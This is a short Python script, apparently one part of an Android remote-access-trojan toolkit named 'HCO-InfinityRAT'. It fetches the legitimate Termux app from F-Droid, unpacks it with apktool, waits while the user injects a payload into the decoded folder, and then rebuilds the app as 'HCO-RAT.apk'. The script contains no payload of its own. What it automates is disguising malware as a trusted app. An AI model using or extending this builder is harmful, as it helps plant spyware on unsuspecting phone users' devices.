# apk_builder.py
import os
import requests
import shutil
import subprocess
import time

BASE_APK_URL = "https://f-droid.org/repo/com.termux_118.apk"
LOCAL_BASE_APK = "base_apk/base.apk"
TARGET_BASE_APK = "base.apk"

def ensure_base_apk():
    if os.path.exists(TARGET_BASE_APK):
        print("[✓] base.apk already exists.")
        return

    # First try to copy from local fallback
    if os.path.exists(LOCAL_BASE_APK):
        print("[+] Copying default base.apk from base_apk directory...")
        shutil.copy(LOCAL_BASE_APK, TARGET_BASE_APK)
        return

    # If not available locally, download from F-Droid
    print("[+] Downloading base.apk from F-Droid...")
    try:
        r = requests.get(BASE_APK_URL, stream=True)
        with open(TARGET_BASE_APK, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print("[✓] base.apk downloaded successfully.")
    except Exception as e:
        print("[X] Failed to download base.apk:", str(e))
        exit(1)

def run_apktool_commands():
    print("[+] Decoding base.apk with apktool...")
    subprocess.run(["apktool", "d", TARGET_BASE_APK, "-o", "payload_template", "--force-all"])

    print("[+] Inject your payload manually or with your script in 'payload_template' folder.")
    input("Press Enter once you’re done editing...")

    print("[+] Rebuilding APK...")
    subprocess.run(["apktool", "b", "payload_template", "-o", "HCO-RAT.apk"])

    print("[✓] APK rebuilt as HCO-RAT.apk")

def main():
    print("=== HCO-InfinityRAT APK Builder ===")
    time.sleep(1)
    ensure_base_apk()
    run_apktool_commands()

if __name__ == "__main__":
    main()
